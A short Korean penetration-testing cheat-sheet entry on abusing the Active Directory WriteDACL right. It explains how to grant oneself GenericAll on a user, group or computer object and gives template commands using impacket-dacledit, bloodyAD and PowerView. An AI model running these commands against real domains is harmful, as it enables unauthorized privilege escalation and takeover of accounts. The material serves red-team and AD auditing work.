# 유저 / 그룹 / 컴퓨터 대상

WriteDACL은 대상 오브젝트의 DACL을 수정할 수 있는 권한이다. 자신에게 GenericAll을 부여한 뒤 해당 타입의 GenericAll 공격을 적용한다.

```bash
impacket-dacledit <도메인>/<공격자계정>:'<패스워드>' \
  -dc-ip <DC_IP> \
  -action write \
  -rights FullControl \
  -principal <공격자계정> \
  -target <대상오브젝트>  # ← 수정

bloodyAD --host <DC_IP> -d <도메인> -u <공격자계정> -p '<패스워드>' \
  add genericAll <대상오브젝트> <공격자계정>  # ← 수정
```

```powershell
Add-DomainObjectAcl -TargetIdentity <대상오브젝트> `
  -PrincipalIdentity <공격자계정> -Rights All -Verbose  # ← 수정
```

이후 해당 오브젝트 타입의 GenericAll 공격 적용.
